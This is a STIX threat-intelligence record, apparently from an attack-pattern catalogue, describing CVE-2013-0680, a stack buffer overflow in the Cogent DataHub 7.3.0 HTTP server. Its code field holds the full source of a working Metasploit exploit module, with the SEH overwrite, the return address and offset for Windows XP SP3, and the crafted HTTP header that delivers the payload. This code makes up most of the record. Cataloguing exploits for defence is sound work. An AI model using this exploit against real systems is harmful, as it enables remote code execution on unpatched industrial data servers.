{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49eecc62-1f64-4fe0-902a-095006a43ce3",
    "created": "2024-08-14T16:53:51.934938Z",
    "modified": "2024-08-14T16:53:51.934942Z",
    "name": "Cogent DataHub HTTP Server Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The vulnerability exists in the HTTP server. While handling HTTP headers, a strncpy() function is used in a dangerous way. This module has been tested successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/cogent_datahub_request_headers_bof.rb",
            "external_id": "cogent_datahub_request_headers_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0680"
        },
        {
            "source_name": "reference",
            "url": "http://www.cogentdatahub.com/Info/130712_ZDI-CAN-1915_Response.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cogent DataHub HTTP Server Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The\n        vulnerability exists in the HTTP server. While handling HTTP headers, a\n        strncpy() function is used in a dangerous way. This module has been tested\n        successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>',\t# Vulnerability discovery\n          'juan vazquez', # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-0680' ],\n          [ 'OSVDB', '95819'],\n          [ 'BID', '53455'],\n          [ 'ZDI', '13-178' ],\n          [ 'URL', 'http://www.cogentdatahub.com/Info/130712_ZDI-CAN-1915_Response.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 33692,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x00\\x0d\\x0a\\x3a\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested with the Cogent DataHub 7.3.0 Demo\n          # CogentDataHubV7.exe 7.3.0.70\n          ['Windows XP SP3 English / Cogent DataHub 7.3.0',\n            {\n              'Ret'         => 0x7ffc070e, # ppr # from NLS tables # Tested stable over Windows XP SP3 updates\n              'Offset'      => 33692,\n              'CrashLength' => 4000 # In order to ensure crash before the stack cookie check\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-07-26'\n    ))\n\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'          => \"/datahub.asp\",\n      'method'       => 'GET',\n    })\n\n    if res and res.code == 200 and res.body =~ /<title>DataHub - Web Data Browser<\\/title>/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    off = target['Offset'] + 8 # 8 => length of the seh_record\n    bof = payload.encoded\n    bof << rand_text_alpha(target['Offset'] - payload.encoded.length)\n    bof << generate_seh_record(target.ret)\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + off.to_s).encode_string\n    bof << rand_text(target['CrashLength'])\n\n    print_status(\"Sending request to #{rhost}:#{rport}\")\n\n    send_request_cgi({\n      'uri'          => \"/\",\n      'method'       => 'GET',\n      'raw_headers'  => \"#{bof}: #{rand_text_alpha(20 + rand(20))}\\r\\n\"\n    })\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-07-26",
    "x_mitre_platforms": [
        "win'"
    ]
}